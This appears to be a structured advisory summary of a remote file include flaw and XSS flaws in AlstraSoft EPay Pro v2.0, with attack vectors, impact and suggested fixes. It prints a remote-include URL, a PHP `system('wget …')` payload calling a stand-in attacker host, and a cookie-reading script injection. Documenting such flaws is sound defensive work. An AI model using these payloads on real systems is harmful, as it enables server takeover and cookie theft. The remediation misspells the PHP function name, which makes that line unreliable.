      "source": "marc.info_d74ea649_20250125_144738.html",
      "details": "AlstraSoft EPay Pro v2.0 has a file include vulnerability and multiple XSS vulnerabilities.\n\n**File Include Vulnerability:**\n- **Root Cause:** The application directly includes user-supplied input in a file path, without proper sanitization or validation.\n- **Weakness:** Lack of input validation on the `view` parameter, allowing inclusion of arbitrary files or URLs.\n- **Attack Vector:**  By manipulating the `view` parameter in the `index.php` URL (e.g., `http://localhost/epal/index.php?view=http://www.whatismyip.com?`), an attacker can include remote files.\n- **Impact:** An attacker can achieve arbitrary command execution. By including a malicious file containing code such as `<? system('wget http://www.hacker.com'); ?>`, the server will execute that command. This could lead to a full compromise of the server. \n\n**XSS Vulnerabilities:**\n- **Root Cause**: Insufficient sanitization of user-supplied input when generating the HTML output.\n- **Weakness**: The `order_num`, `payment` and potentially other parameters are vulnerable to XSS, allowing malicious JavaScript to be injected into the page.\n- **Attack Vector**: By injecting a JavaScript payload in the `order_num` or `payment` parameters of the URL (e.g., `http://localhost/epal/?order_num=crap&payment=>\"<script>alert(document.cookie)</script>&send=first&send=regular&send=priority&send=express`), an attacker can execute arbitrary JavaScript code within the user's browser.\n- **Impact:** An attacker could steal user's cookies, perform actions on behalf of the user, or redirect them to a malicious site.",
        "remediation": "The suggested fixes are to use `htmlspeacialchars()` to prevent XSS and to implement a base directory for file includes to restrict included files to a safe path."
